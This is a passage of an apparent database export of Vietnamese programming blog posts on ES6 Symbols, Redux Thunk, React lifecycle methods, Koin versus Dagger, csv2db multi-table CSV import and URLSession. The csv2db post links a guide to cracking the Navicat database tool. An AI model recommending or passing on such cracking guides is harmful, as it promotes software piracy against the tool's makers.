true\n};\n\nObject.getOwnPropertyNames(o); // ["foo", "baz"]\n```\nĐể lấy ra object's symbol properties:\n```\nObject.getOwnPropertySymbols(o); // [Symbol(bar)]\n```\nThế nên ta hiểu rằng thực ra symbol không bị ẩn hay không thể truy cập, ta luôn có thể thấy nó trong `Object.getOwnPropertySymbols(..)` enumeration.\n\n### Built-in Symbols\nES6 có một ít predefined built-in symbol cho thấy các hành vi meta của JavaScript object. Và một điều nữa là các built-in symbol này không được register vào global symbol registry.\n\nThay vào đó, JS lưu chúng ở dạng property của Symbol function object. Ví dụ như:\n```\nvar a = [1, 2, 3];\na[Symbol.iterator]; // native function\n```\nTrong specs người ta sử dụng prefix là `@@` để tham chiếu đến built-in symbols, thông dụng có là: `@@iterator`, `@@toSringTag`, `@@toPrimitive`. Còn một vài cái nữa nhưng mà ít xài đến.\n\n# Kết\nTrên đây là một số kiến thức về Symbol trong ES6, hy vọng sẽ là một nguồn tham khảo hữu ích cho bạn đọc.\n\n-----\n*Dịch và tham khảo từ [You Don't Know JS - ES6 & Beyond](https://www.amazon.com/You-Dont-Know-JS-Beyond/dp/1491904240)*	Symbol\n\nKể từ ES6, một primitive type mới đã được thêm vào JavaScript, đó là symbol. Không giống như các primitive type khác, symbol không có literal form.\n\nĐây là cách mà ta tạo ra một symbol:\n\nCần lưu ý rằng:\n\n- Ta không thể và không nên sử dụng new với Symbol(..). Nó không phải là một constructor và về cơ bản thì chúng ta không phải đang tạo object.\n- Biến truyền vào Symbol(..) là optional. ...	{}	1	Bàn về JS - Symbols	{javascript}	0	f	2022-12-18 15:33:37.914+00	2022-12-18 15:33:37.914+00
32003	Chào mọi người, nếu bạn là người đã biết về React và đang làm quen với Redux chắc hẳn bạn đang rất mơ hồ về các khái niệm cơ bản của Redux như dispatch, store, action creator,... bạn còn đang vật lộn với đống document của Redux để hiểu những khái niệm đó và bạn nghe ai đó trong team nói về Redux Thunk, thế là lại một khái niệm nữa cần phải tìm hiểu và bạn bắt đầu lẫn lộn giữa Redux, Thunk hay thậm chí là Middleware.\n\nVậy nên hôm nay chúng ta sẽ cùng tìm hiểu về cách hoạt động của Redux Thunk.\n\n### 1.  Nhắc lại về Redux\nRedux js là một thư viện Javascript giúp tạo ra thành một lớp quản lý trạng thái của ứng dụng. Được dựa trên nền tảng của ngôn ngữ Elm kiến trúc Flux do Facebook giới thiệu, do vậy Redux thường là bộ đôi kết hợp hoàn hảo với React.\n\nKhi sử dụng Redux trong ứng dụng của mình, trạng thái (State) của toàn bộ ứng dụng được lưu trong một Store duy nhất, khi ta muốn thay đổi một State nào đó, tại một Component, ta cần tạo một Action, Component này sẽ đóng vai trò là Action creator (nói nôm na là bộ tạo Action :laughing: )  thông thường một Action là một `object`, các bạn lưu ý điểm này nhé, Action phải là một `object`. Một Action luôn luôn có giá trị trả về type và giá trị payload có thể có hoặc không. Ở đây ta có ví dụ về một Action đơn giản trả về cho Reducer một đối tượng `song`.\n```\nexport const selectSong = song => {\n    return {\n        type: "SELECT_SONG",\n        payload: song\n    };\n};\n```\nAction này sẽ được đưa đến tất cả các Reducer và chỉ những Reducer quan tâm đến `type` của Action này sẽ phân tích Action được gửi lên và sau đó xử lý và cuối cùng trả ra một state mới đưa đến Component như một props.\nTổng quát, vòng đời của Redux được mô tả như hình dưới đây:\n\n![](https://images.viblo.asia/a4ca6206-20ab-4c89-a10f-aa60be341179.png)\n\n\n### 2. Vậy Redux Thunk là gì?\nĐến đây các bạn sẽ thắc mắc vậy Redux Thunk là gì và nó được áp dụng như thế nào. Chúng ta cùng quay lại ví dụ về Action ở bên trên, ta thấy rằng Action này trả về một *plain Javascript object*, object này là hợp lệ để các Reducer có thể tiếp nhận và xử lý nó. Nhưng đôi lúc trong ứng dụng của chúng ta nó lại không đơn giản như vậy :cry: các action cần trả về một function chẳng hạn, các action này được gọi là `Async Action`, thì đây là nơi mà Redux Thunk làm việc, ta lấy một ví dụ về một trường hợp Action không còn là một *plain object* nữa:\n\n```\nimpport dataUsers from '../api/datausers';\n\nexport const getUsers = async () => {\n    const response = await dataUsers.get('/users');\n    return {\n        type: 'GET_USERS',\n        payload: response\n    }\n};    \n```\n\n"Đợi đã! Action này cũng là một plain object mà, nó cũng gồm cặp `key` và `value` đấy thôi" - đây là sai lầm của các bạn mới làm quen với javascript hay React. Action này không phải là một plain javascript object mặc dù nó có cú pháp giống với một PJO. Nhờ vào việc sử dụng cú pháp `ES6` mà nó dễ gây nhầm lẫn cho những bạn mới bắt đầu, không tin các bạn cứ thử kiểm tra đoạn code trên với Babel xem, và bạn sẽ thấy phần `return` trả về một đống code dài dòng khó hiểu chứ không còn là một PJO nữa. Do vậy cách tiếp cận ở trên là sai với khái niệm của một Action thông thường.\n\nQuay lại với Thunk, Redux Thunk cho phép trả về các Action là một function thay vì chỉ là một PJO, nó đóng vai trò là một Middleware được đặt trước thời điểm reducer nhận request để nhận biết các action có trả về một PJO hay không, nếu đó là một PJO, Thunk sẽ chuyển action đó đến Reducer như thường lệ, nếu action trả về là một function, Redux Thunk sẽ "chặn" action đó lại và đợi cho đến khi một lệnh asynchronous nào đó trong function hoàn tất và trả về kết quả (như giá trị `response` ở trên).\nĐến đây chúng ta đã nhận được một PJO và Redux Thunk sẽ cho action này đến Reducer như bình thường. Do vậy chúng ta có sơ đồ như sau:\n\n![](https://images.viblo.asia/ed9a2e6f-55a4-4ec3-925f-1f368d6bf10f.png)\n\nTa viết lại Action ở trên, thay vì  `return`, ta sử dụng hàm `dispatch` \n\n```\nimpport dataUsers from '../api/datausers';\n\nexport const getUsers = () => async dispatch => {\n    const response = await dataUsers.get('/users');\n     dispatch({\n          type: 'GET_USERS',\n          payload: response \n     });\n};    \n```\n\n\n### 3. Kết luận\n\n* Redux Thunk là một Middleware cho phép bạn viết các Action trả về một function thay vì một plain javascript object bằng cách trì hoãn việc đưa action đến reducer.\n* Redux Thunk được sử dụng để xử lý các logic bất đồng bộ phức tạp cần truy cập đến Store hoặc đơn giản là việc lấy dữ liệu như Ajax request.\n\nĐến đây có lẽ các bạn đã hiểu được mục đích của Redux Thunk được sử sụng trong các dự án rồi, ở kỳ tới chúng ta sẽ cùng nói kỹ hơn về Async Action với Redux Thunk, hẹn gặp lại ở bài viết tới.\n\n*Tham khảo*\nhttps://medium.com/@User3141592/understanding-the-redux-thunk-source-code-b3f8b930faf6	Chào mọi người, nếu bạn là người đã biết về React và đang làm quen với Redux chắc hẳn bạn đang rất mơ hồ về các khái niệm cơ bản của Redux như dispatch, store, action creator,... bạn còn đang vật lộn với đống document của Redux để hiểu những khái niệm đó và bạn nghe ai đó trong team nói về Redux Thunk, thế là lại một khái niệm nữa cần phải tìm hiểu và bạn bắt đầu lẫn lộn giữa Redux, Thunk hay t...	{https://images.viblo.asia/a4ca6206-20ab-4c89-a10f-aa60be341179.png,https://images.viblo.asia/ed9a2e6f-55a4-4ec3-925f-1f368d6bf10f.png}	1	Tìm hiểu về Redux Thunk	{react,redux}	0	f	2022-12-18 15:33:37.96+00	2022-12-18 15:33:37.96+00
32005	# Giải thích React Component Lifecycle\n![](https://images.viblo.asia/f2743129-108a-48c4-9ee2-577dc8d02855.png)\n+ Để bắt đầu với React, việc hiểu lifecycle của component là bắt buộc.\n\n+ Các phương thức của lifecycle là một dạng hook (giống như khái niệm hook trong wordpress)\n\n+ Có thể group các phương thức lifecycle ra 3 nhóm, ứng với 4 giai đoạn của component: Mounting, Updating, Unmounting, Error Handling\n\n### Mounting\n+ Sẽ chạy theo thứ tự sau\n1. constructor()\n2. static getDerivedStateFromProps()\n3. render()\n4. componentDidMount()\n### Updating\n+ Các phương thức này sẽ được gọi khi có sự thay đổi của state hoặc props\n1. static getDerivedStateFromProps()\n2. shouldComponentUpdate()\n3. render()\n4. getSnapshotBeforeUpdate()\n5. componentDidUpdate()\n### Unmounting\n+ Phương thức được gọi trước khi remove component khỏi DOM\n1. componentWillUnmount()\n### Error Handling\n+ Bất kể lỗi ở đâu trong component, nó sẽ gọi đến phương thức này\n1. componentDidCatch()\n##  1. render()\n+ Đây là phương thức bắt buộc duy nhất khi tạo ra một component, bắt buộc trả về một trong những giá trị\n\n+ React element\n+ Arrays and fragments\n+ Portals\n+ String and numbers\n+ Booleans or null\n\n**+ Lưu ý: hàm này sẽ không được gọi nếu shouldComponentUpdate() return false(mặc định trong component hàm này sẽ trả về true nhưung người dùng có thể ghi đè lại nó)**\n## 2. componentDidMount()\n+ Component đã được tạo, là lúc mà ta gọi AJAX\n```\ncomponentDidMount() {\n  fetch('https://gitconnected.com')\n    .then((res) => {\n      this.setState({\n        user: res.user\n      });\n    });\n}\n```\n\n+ Có thể gọi setState() ở dòng đầu tiên của phương thức componentDidMount(), hàm render() sẽ được gọi lại một lần nữa, nhưng nó chỉ xảy ra trước khi trình duyệt update DOM, render chắc chắn sẽ gọi 2 lần, user có thể không nhận ra sự thay đổi này, tuy nhiên đây là nguyên nhân cho vấn đề với performance. Nhưng cần thiết trong trường hợp như modal hay tooltip chúng ta cần tính toán vị trí của DOM trước khi render\n## 3. componentDidUpdate(prevProps, prevState, snapshot)\n\n+ Ngay sau khi component được cập nhập, hook này sẽ được gọi. Không gọi trong lần render đầu. Đây cũng có thể là nơi để tạo một network request khi chúng ta so sánh prop hiện tại với prop ở thời điểm trước đó\n\n```\ncomponentDidUpdate(prevProps, prevState, snapshot) {\n  // Trường hợp thường dùng (đừng quên kiểm tra so sánh props):\n  if (this.props.userID !== prevProps.userID) {\n    this.fetchData(this.props.userID);\n  }\n}\n```\n\n**+ Lưu ý: Nếu muốn gọi setState ở đây, phải đưa nó trong câu điều kiện, nếu không sẽ bị lặp vô tận**\n\n**+ Nếu có implement phương thức getSnapshotBeforeUpdate(), giá trị return của getSnapshotBeforeUpdate() sẽ được đưa vào snapshot, nếu không thì là undefined**\n\n**+ Hàm này cũng không được gọi nếu shouldComponentUpdate() return false**\n## \n## 4. componentWillUnmount\n+ Thường được sử dụng để remove các listener, các hàm setInterval, cancel network request\n```\ncomponentWillUnmount() {\n  window.removeEventListener('resize', this.resizeEventHandler);\n}\n```\n## 5. shouldComponentUpdate(nextProps, nextState)\n+ Phương thức này để cải thiện performance của React, vì đôi lúc thay đổi state hoặc props ta không muốn cập nhập lại UI, chỉ cần cho hàm này return false (mặc định là return true), khi return false thì render, componentDidUpdate sẽ không được gọi.\n```\nshouldComponentUpdate(nextProps, nextState) {\n   return this.props.clicks !== nextProps.clicks;\n}\n```\n\n## 6. getSnapshotBeforeUpdate(prevProps, prevState)\n+ Gọi ngay trước khi render xuống DOM, cho phép lấy một số thông tin của DOM (ví dụ vị trí thanh scroll), các giá trị return từ hàm này sẽ đưa cho componentDidUpdate()\n## 7. componentDidCatch(error, info)\n+ Nếu một component nào đó bị lỗi nó sẽ không chết nguyên cái app nữa mà sẽ quăn lỗi ở đây, sử dụng để hiển thị lỗi lên UI\n```\nclass ErrorBoundary extends React.Component {\n  constructor(props) {\n    super(props);\n    this.state = { hasError: false };\n  }\n\n  componentDidCatch(error, info) {\n    // Display fallback UI\n    this.setState({ hasError: true });\n    // You can also log the error to an error reporting service\n    logErrorToMyService(error, info);\n  }\n\n  render() {\n    if (this.state.hasError) {\n      // You can render any custom fallback UI\n      return <h1>Something went wrong.</h1>;\n    }\n    return this.props.children;\n  }\n}\n\n<ErrorBoundary>\n  <MyWidget />\n</ErrorBoundary>\n```\n\n## 8. Kết luận.\n+ Trên đây là bài viết khá chi tiết về component life-cycle hay sử dụng được mình tổng hợp lại để củng cố lại kiến thức và có thể giúp các bạn mới tìm hiểu hiểu về cách sử dụng của các method này!\n+ Tài liệu đầy đủ và chính thức: https://reactjs.org/docs/state-and-lifecycle.html	Giải thích React Component Lifecycle\n\n+ Để bắt đầu với React, việc hiểu lifecycle của component là bắt buộc.\n\n+ Các phương thức của lifecycle là một dạng hook (giống như khái niệm hook trong wordpress)\n\n+ Có thể group các phương thức lifecycle ra 3 nhóm, ứng với 4 giai đoạn của component: Mounting, Updating, Unmounting, Error Handling\n\nMounting\n+ Sẽ chạy theo thứ tự sau\n1. constructor()\n2. stat...	{https://images.viblo.asia/f2743129-108a-48c4-9ee2-577dc8d02855.png}	1	React Component Lifecycle cơ bản cho người mới bắt đầu	{reactjs}	0	f	2022-12-18 15:33:37.996+00	2022-12-18 15:33:37.996+00
31037	# I. Giới thiệu\nSau nhiều lần cố gắng học Dagger, cuối cùng tôi cũng tìm thấy Koin. Koin tiết kiệm thời gian và dễ dàng sử dụng. Bài viết này giải thích Koin là gì, so sánh với Dagger và cách sử dụng nó.\n\n# II. Koin là gì?\n"Koin is a simple powerful Dependency injection framework for Kotlin" . Là framework được viết bằng kotlin thuần tuý, sử dụng để giải pháp bằng function nên không code tự sinh, không ánh xạ.\n\n# III. So sánh với Dagger\nĐể so sánh giữa 2 kiểu triển khai, ta sẽ tập trung vào dự án được triển khai bằng dagger và bây giờ là koin. Dự án sử dụng MVVM, retrofit và LiveData. Project có 1 activity, 4 fragments, 5 viewModels, repository và webservice interface. Vì vậy có thể nói đây là 1 dự án nhỏ chỉ để thiết kế cơ sở cho các ứng dụng tương lai.\n\nĐầu tiên hãy nhìn package DI  của Dagger và Koin\n\n![](https://images.viblo.asia/d4b97558-a008-4498-8185-4d0cd44b64bf.png)\n\nNhư bạn có thể thấy, dagger cần khá nhiều class. Ví dụ ViewModel cần 3 file\n\n**Line of code**\nĐể có được những con số này, tôi đã sử dụng thống kê. Tôi đã sử dụng nó hai lần trước và sau khi biên dịch dự án với cả Dagger và Koin. \n\n![](https://images.viblo.asia/97967e29-c0b2-4dcb-8f9b-68bac60dccb7.png)\n\nCó thể thấy số lượng dòng code generated ra nhiều hơn koin\n\n**Build time**\nsau khi clean project và build lại. Tôi được kết quả:\n\n```\nKoin:\nBUILD SUCCESSFUL in 17s\n88 actionable tasks: 83 executed, 5 up-to-date\n```\n\n```\nDagger:\nBUILD SUCCESSFUL in 18s\n88 actionable tasks: 83 executed, 5 up-to-date\n```\n\nKết quả này cho thấy nếu dự án lớn hơn nữa thì sự chênh lệch sẽ lớn hơn nữa\n\n# IV. Cài đặt\n\n- Thêm dòng sau vào gradle:\n\n```\nimplementation "org.koin:koin-android-viewmodel:$koin_version"\n```\n\n- Học dagger rất khó, vì vậy để tiếp cận với dagger mất khá nhiều thời gian cho người mới bắt đầu, nhưng với koin thì mọi việc dễ dàng hơn rất nhiều\n\nSau khi thêm dependency Koin, chúng ta có thể triển khai mô-đun đầu tiên của mình, giống như Dagger, chúng ta có thể triển khai mọi mô-đun trong một tệp riêng biệt, nhưng vì để đơn giản, tôi quyết định triển khai tất cả các mô-đun trong một tệp. Bạn có thể tách nó sau.\n\nĐầu tiên, cần biết mộit số lưu ý về koin syntax:\n\n- get() : giải quyết 1 instance trong module koin, chỉ cần sử dụng get() cho instance được yêu cầu. get() thường được sử dụng trong hàm tạo, để inject constructor value\n- factory : định nghĩa rằng sẽ cung cấp cho bạn 1 instance mới mỗi khi bạn yêu cầu\n- single: cung cấp 1 singleton được định nghĩa\n- name = : được sử dụng định nghĩa tên. Điều này là bắt buộc khi bạn muốn có nhiều phiên bản của cùng 1 class với các loại khác nhau\n\n```\n\nimport com.farshid.data.remote.network.AuthApi\nimport com.farshid.data.remote.network.GeneralApi\nimport com.farshid.data.remote.network.MasseurHubWebApi\nimport com.farshid.data.repository.authRepo.AuthRepo\nimport com.farshid.view.authentication.enteremail.EnterEmailViewModel\nimport com.farshid.view.authentication.entermobilenumber.EnterMobileNumberViewModel\nimport com.farshid.view.authentication.enterverificationcode.EnterVerificationCodeViewModel\nimport com.farshid.view.authentication.nameandbirthday.NameAndBirthdayViewModel\nimport com.farshid.view.authentication.selectgender.SelectGenderViewModel\nimport com.farshid.view.authentication.startpage.StartPageViewModel\nimport com.farshid.view.authentication.uploadimages.UploadImagesViewModel\nimport org.koin.android.viewmodel.ext.koin.viewModel\nimport org.koin.dsl.module.module\nimport retrofit2.Retrofit\n\n\nprivate val retrofit: Retrofit = createNetworkClient()\n\nprivate val generalApi: GeneralApi = retrofit.create(GeneralApi::class.java)\nprivate val authApi: AuthApi = retrofit.create(AuthApi::class.java)\n\nval viewModelModule = module {\n    viewModel { LoginFragmentViewModel(get()) }\n    viewModel { StartPageViewModel() }    \n}\n\nval repositoryModule = module {\n    single { AuthRepo(authApi = get()) }\n}\n\nval networkModule = module {\n    single { generalApi }\n    single { authApi }    \n}\n\nval databaseModule = module {\n\n}\n\nval sharedPrefModule = module {\n\n}\n```\n\nThay vì tạo nhiều file có nhiều chú thích, nhiều thành phần, ta tạo 1 file đơn giản và dễ đọc\n\n- createdNetworkClient là một hàm để tạo một instance Retrofit. thiết lập baseUrl, thêm ConverterFactory và Interceptor được thực hiện ở đó.\n\n```\nprivate val generalApi: GeneralApi =  retrofit.create(GeneralApi::class.java)\nprivate val authApi: AuthApi = retrofit.create(AuthApi::class.java)\n```\nAuthApi và GeneralApi là 2 retrofit endpoints interface\n\n```\nval viewModelModule = module {\n    viewModel { LoginFragmentViewModel(get()) }\n    viewModel { StartPageViewModel() }    \n}\n```\n\nta khai báo viewmodel dươis dạng viewmodel trong 1 module. Koin sẽ cung cấp 1 viewmodel cho vòng đời ViewModelFactory và giúp liên kêý nó với các thành phần hiện tại. Như bạn có thể thấy chúng ta có phương thức get() vào hàm tạo của LoginFragmentViewModel nó giải quyết instance cho LoginFragmentViewModel\n\n**Sau tất cả chúng ta nói DI để genarate code, vậy nó làm như thế nào?**\nTrong Application class, trong phương thức onCreate viêt thêm mothod\n\n```\nstartKoin(this, listOf(repositoryModule, networkModule, viewModelModule))\n```\n\nở đây chúng ta chỉ cần gọi phương thức startKoin, thêm context và danh sách các module mà ta muốn khởi tạo với koin\n\nSử dụng ViewModel trong View(activity,fragment)\n\n```\nprivate val startPageViewModel: StartPageViewModel by viewModel()\n```\n\nGiờ chúng ta có thể sử dụng viewmodel trong view\n# Tổng kết\nKoin đơn giản và dễ sử dụng hơn dagger\n\nref: https://medium.com/@farshidabazari/android-koin-with-mvvm-and-retrofit-e040e4e15f9d	I. Giới thiệu\nSau nhiều lần cố gắng học Dagger, cuối cùng tôi cũng tìm thấy Koin. Koin tiết kiệm thời gian và dễ dàng sử dụng. Bài viết này giải thích Koin là gì, so sánh với Dagger và cách sử dụng nó.\n\nII. Koin là gì?\n"Koin is a simple powerful Dependency injection framework for Kotlin" . Là framework được viết bằng kotlin thuần tuý, sử dụng để giải pháp bằng function nên không code tự sinh, k...	{https://images.viblo.asia/d4b97558-a008-4498-8185-4d0cd44b64bf.png,https://images.viblo.asia/97967e29-c0b2-4dcb-8f9b-68bac60dccb7.png}	1	Android - Koin vs Dagger, Say hello to Koin	{android,koin}	0	f	2022-12-18 15:33:38.017+00	2022-12-18 15:33:38.017+00
31994	## Mở đầu\n\nBạn có bao giờ nhận được file excel từ khách hàng và bắt code chức năng hiển thị, tìm kiếm các thứ trên giao diện web và ứng dụng. Ok đầu tiên thiết kế database sau đó bằng cách nào đó import cái file excel này vào csdl. Vấn đề sẽ đơn giản nếu file excel tương ứng với 1 bảng. Ta dùng một tool gì đó như mình thì dùng Navicat để import. Mọi việc sẽ phức tạp hơn nếu như ta cần từ file excel import tới related table. Lần thứ nhất gặp phải ngồi code ít nhanh nhanh để import được, code xong bỏ đi, lần thứ 2 làm được thì tốt nhất là làm cái tools. Trước khi code thì xem đã có giải pháp nào chưa. Tìm rồi thấy rồi thì chia sẻ, contribute lại cho người ta. Có thể bạn vẫn chưa hiểu import nhiều bảng là gì thì xem tiếp phần bên dưới.\n\n## Import 1 bảng\n\nSử dụng Navicat [Hướng dẫn crack](https://viblo.asia/p/cong-cu-quan-ly-co-so-du-lieu-navicat-va-huong-dan-crack-tren-ubuntu-window-aWj539DeZ6m)\n\n## Công cụ import vào nhiều bảng\n\nMình tìm thấy ở đây [Github original csv2db](https://github.com/goFrendiAsgard/csv2db.py). Hoặc tham khảo bản [fork](https://github.com/taminhluan/csv2db.py) của mình thêm được ít code ví dụ và collation utf8 khi import.\n\nXin phép copy README.md của tác giả\n\nWhat is it?\n===========\n\ncsv2db.py is a simple program to import data into any database platform (which is supported by sqlalchemy).\n\nNew features\n===========\n\nUse pip install -r requirements.txt\n\nIssues\n===========\n\n* [ ] Truncage float type if empty string\n\n\nWhat is it for?\n===============\n\n__Short answer:__\n\nTo help you\n\n__Long answer:__ \n\nYou have make a complex and perfect database structure. You have also finish the program, so it should work just fine. Later, you find that your client already has a primitive-worksheet data storage which is consist of thousands rows (usually in xls extension). Simply import csv into database is impossible since a row in the worksheet is related to several tables.\n\nLook for this `normal` worksheet: \n\n| Transaction code  | Date          | Item code     | Item name     | Price        | Quantity     |\n| :---------------- | :------------ | :------------ | :------------ | :----------- | :----------- |\n| T001              | 08/10/2013    | I001          | Candy         | $5           | 4 pcs        |\n|                   |               | I002          | Chocolate     | $10          | 5 pcs        |\n| T002              | 08/20/2013    | I003          | Coke          | $7           | 1 bottle     |\n|                   |               | I001          | Candy         | $5           | 1 pcs        |\n| T003              | 08/21/2013    | I004          | Coffee        | $2           | 1 cup        |\n|                   |               | I003          | Coke          | $7           | 1 bottle     |\n|                   |               | I001          | Candy         | $5           | 1 pcs        |\n|                   |               | I005          | 新聞          | $10.00       | 1 exemplar   |\n\n\nPretty normal, right?\n\nNow, you need to import the worksheet into 3 tables, `transaction`, `transaction_detail`, and `item`\nThe content and structure of `transaction` table should be:\n\n| id  | code     | date          |\n| --: | :------- | :------------ |\n| 1   | T001     | 2013-08-10    |\n| 2   | T002     | 2013-08-20    |\n| 3   | T003     | 2013-08-21    |\n\nThe content and structure of `item` table should be:\n\n| id  | code     | name          | price       | unit     |\n| --: | :------- | :------------ | ----------: | :------- |\n| 1   | I001     | Candy         | 5           | pcs      |\n| 2   | I002     | Chocolate     | 10          | pcs      |\n| 3   | I003     | Coke          | 7           | bottle   |\n| 4   | I004     | Coffee        | 2           | cup      |\n| 5   | I005     | 新聞          | 10          | exemplar |\n\nThe content and structure of `transaction detail` table should be:\n\n| id  | id_transaction   | id_item     | qty     |\n| --: | ---------------: | ----------: | ------: |\n| 1   | 1                | 1           | 4       |\n| 2   | 1                | 2           | 5       |\n| 3   | 2                | 3           | 1       |\n| 4   | 2                | 1           | 1       |\n| 5   | 3                | 4           | 1       |\n| 6   | 3                | 3           | 1       |\n| 7   | 3                | 1           | 1       |\n| 8   | 3                | 5           | 1       |\n\nFirstly you think it is going to be easy, but after realize that `transaction` and `item` has many-to-many relationship, you start to think it is not as easy as it firstly seen.\n\nYou start to curse your client's primitive datastore. You know, make your own code is possible, but it going to take a very long time.\n\ncsv2db.py is made to turn the possible into easy.\n\n\nPrerequisites\n=============\n\n* python 2.7.\n* sqlalchemy.\n* a functioning brain.\n* an ability to code in Python (at least able to modify what need to be modified).\n\nLinux users can do this:\n\n    sudo apt-get install python python-sqlalchemy\n\nWindows users should find their own way. \n\nHow to use\n==========\n\n* If your file is in either `xls` or `ods` extension, you must convert them into `csv` (i.e: By using `File|Save As` menu).\n  The `csv` file is still readable and editable by your office program. In addition, the csv can also be viewed as `text file`\n\n* Here is the `csv` of the previous worksheet example:\n    ```\n        "Transaction Code","Date","Item Code","Item Name","Price","Quantity"\n        "T001",08/10/13,"I001","Candy","$5.00","4 pcs"\n        ,,"I002","Chocolate","$10.00","5 pcs"\n        "T002",08/20/13,"I003","Coke","$7.00","1 bottle"\n        ,,"I001","Candy","$5.00","1 pcs"\n        "T004",08/21/13,"I004","Coffee","$2.00","1 cup"\n        ,,"I003","Coke","$7.00","1 bottle"\n        ,,"I001","Candy","$5.00","1 pcs"\n        ,,"I005","新聞","$10.00","1 exemplar"\n\n    ```\n\n* Ensure your database & tables are already exists.\n\n* Make a python script just as in [test.py](test.py)\n\n    ```python        \n\n        from csv2db import csv2db\n\n        # connection string (used by sqlalchemy)\n        connection_string = 'sqlite:///test.db'\n        # MySQL connection_string example. Beware of the charset\n        # connection_string = 'mysql://root:toor@localhost:3306/test?charset=utf8'\n\n        # the csv file name. If your worksheet is on "xls" format, please convert them into csv first (i.e: in MS Excel you can use File | Save As)\n        # the first line of the csv should be the header\n        file_name = 'test.csv'\n\n        # more info about csv_param: http://docs.python.org/2/library/csv.html#csv-fmt-params\n        csv_param = {\n            'delimiter': ',',   # libre office usually use "," while microsoft office usually use "tab"\n            'quotechar': '"'    # both, libre office and microsoft office usually use '"'\n        }\n\n        ########################################################################\n\n        # define several preprocessing callbacks. These callbacks will be used to preprocess every cell based on it's column\n\n        def change_date_format(human_date):\n            ''' change 08/31/2000 into 2000-08-31\n            '''\n            date_part = human_date.split('/')\n            if len(date_part) == 3:\n                day = date_part[1]\n                month = date_part[0]\n                year = date_part[2]\n                computer_date = year + '-' + month + '-' + day\n            else:\n                computer_date = ''\n            return computer_date\n\n        def remove_dollar(value):\n            ''' remove $, computer doesn't understand $\n            '''\n            return float(value.replace('$', ''))\n\n        # callback dictionary. The key is caption of the column, the value is the function used\n        callback = {\n            'Date' : change_date_format,\n            'Price' : remove_dollar\n        }\n\n        ########################################################################\n\n        # specific preprocess function (in case of 2 different fields refer to the same csv column)\n\n        def filter_qty(value):\n            ''' get "1" as int from "1 bottle" string\n            '''\n            return int(value.split(' ')[0])\n\n        def filter_unit(value):\n            ''' get "bottle" from "1 bottle"\n            '''\n            return ' '.join(value.split(' ')[1:])\n\n        ########################################################################\n\n        # the table structure of your database and how they related to your csv file\n        # WARNING: "unique" doesn't has any correlation with database unique constraint, unique is used as csv record identifier (since primary key does not exists in csv)\n        # if you have many "unique" field, AND logic will be used to distinguish a field from another field\n        table_structure_list = [\n            {\n                'table_name' : 'trans',\n                'column_list': {\n                    'id'    : {'primary': True},\n                    'code'  : {'caption': 'Transaction Code', 'unique': True},\n                    'date'  : {'caption': 'Date'}\n                }\n            },\n            {\n                'table_name' : 'item',\n                'column_list': {\n                    'id'    : {'primary': True},\n                    'code'  : {'caption': 'Item Code', 'unique': True},\n                    'name'  : {'caption': 'Item Name'},\n                    'price' : {'caption': 'Price'},\n                    'unit'  : {'caption': 'Quantity', 'preprocess' : filter_unit}\n                }\n            },\n            {\n                'table_name' : 'trans_detail',\n                'column_list': {\n                    'id'                : {'primary'  : True},\n                    'id_transaction'    : {'reference': 'trans.id', 'unique': True},\n                    'id_item'           : {'reference': 'item.id', 'unique': True},\n                    'qty'               : {'caption'  : 'Quantity', 'preprocess': filter_qty}\n                }\n            }\n        ]\n\n        # and here is the magic:\n        csv2db(file_name, csv_param, connection_string, table_structure_list, callback)\n    ```\n\n* Run your python script, and your database should be filled automagically\n\n    ```\n        python test.py\n    ```\n\nTodo\n=====\n\n* Make db2csv.py\n\nHelp me\n========\n\n* If you are a `python-coder` and `github-user`, you can fork this project and do some `pull requests` or submit some `issues`\n* If you think this simple script help you save your time and money, please consider to [![Donate](https://www.paypalobjects.com/en_US/i/btn/btn_donate_LG.gif)](https://www.paypal.com/cgi-bin/webscr?cmd=_s-xclick&hosted_button_id=YDES6RTA9QJQL)\n\nDisclaimer\n==========\n\nIf you are a `mere-mortal-computer-user`, and doesn't have any intention to learn programming, than sadly said, this thing is not for you.\n\nAuthor: Tạ Minh Luận\n\nOriginal Link: https://taminhluan.github.io/blog/Import-File-csv-toi-nhieu-bang-trong-co-so-du-lieu-quan-he/\n\nCopyright Notice: All articles in this blog use CC BY-NC-SA 4.0 unless otherwise stated. License Agreement. Please indicate the source!	Mở đầu\n\nBạn có bao giờ nhận được file excel từ khách hàng và bắt code chức năng hiển thị, tìm kiếm các thứ trên giao diện web và ứng dụng. Ok đầu tiên thiết kế database sau đó bằng cách nào đó import cái file excel này vào csdl. Vấn đề sẽ đơn giản nếu file excel tương ứng với 1 bảng. Ta dùng một tool gì đó như mình thì dùng Navicat để import. Mọi việc sẽ phức tạp hơn nếu như ta cần từ file exce...	{https://www.paypalobjects.com/en_US/i/btn/btn_donate_LG.gif}	1	Import File csv tới nhiều bảng trong cơ sở dữ liệu quan hệ	{import-csv,database,tools}	0	f	2022-12-18 15:33:38.062+00	2022-12-18 15:33:38.062+00
31990	# Giới thiệu\nTrong bài viết này mình xin chia sẻ tất tần tật về URLSession, cách tạo HTTP requests cũng như implement background download rằng có thể vừa paused vừa resumed.\nMột ứng dụng cơ bản cần có các chức năng có thể get để lấy dữ liệu từ server, update các trạng thái hay download remote file tới bộ nhớ. Để phục vụ cho anh em những thứ trên thì Apple đã cung cấp URLSession - là một networking API cho việc uploading và downloading content.\n# Bắt đầu nào !!!\nTrước tiên chúng ta vào [link này](https://koenig-media.raywenderlich.com/uploads/2019/06/URLSession-Materials.zip) để download materials cho demo này.\nBuild và run project này thì bạn sẽ nhìn thấy một view bao gồm một search bar ở trên top và một empty tableview ở ngay bên dưới search bar.\n![](https://images.viblo.asia/195a80d0-d94a-43ec-b368-ced52ffff8b6.png)\n## URLSession Overview\nTrước khi bắt đầu chúng ta nên xem qua kiến trúc của URLSession. Nó bao gồm một class và một bộ các class cho việc handling HTTP/HTTPS-based requests.\n![](https://images.viblo.asia/443eaf0c-96f3-48f6-a217-d424e93a9de7.png)\nURLSession là đối tượng chịu trách nhiệm chính cho việc gửi và nhận HTTP requests. Bạn có thể tạo một URLSessionConfiguration - cái mà có 3 loại phục vụ cho từng mục đích sử dụng:\n* `.default`: Tạo một đối tượng default configuration để sử dụng cho việc lưu trữ đối tượng trên disk-persisted global cache, credential và cookie.\n* `.ephemeral`: Cũng tương tự như `.default` configuration. Ngoại trừ tất cả những session-related tới dữ liệu được lưu trữ trong bộ nhớ. Có thể hiểu là "private" sesstion\n* `.background`: Đối với loại này cho phép thực hiện việc upload hay download tasks trong background. Tiếp tục ngay cả khi app rơi vào trạng thái suspended hay terminated.\nNgoài ra 